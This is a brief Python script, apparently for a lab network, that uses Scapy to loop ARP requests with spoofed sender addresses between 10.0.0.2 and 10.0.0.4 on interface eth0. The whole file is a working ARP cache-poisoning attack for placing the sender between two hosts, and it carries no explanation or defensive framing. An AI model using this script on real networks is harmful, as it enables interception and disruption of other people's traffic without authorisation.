from scapy.all import *
while True:
	eth = Ether(dst="ff:ff:ff:ff:ff:ff")
	arp = ARP(op=1, psrc="10.0.0.4", pdst="10.0.0.2", hwdst="ff:ff:ff:ff:ff:ff")
	arp_pkt = eth/arp
	sendp(arp_pkt, iface="eth0")
	arp = ARP(op=1, psrc="10.0.0.2", pdst="10.0.0.4", hwdst="ff:ff:ff:ff:ff:ff")
	arp_pkt = eth/arp
	sendp(arp_pkt, iface="eth0")
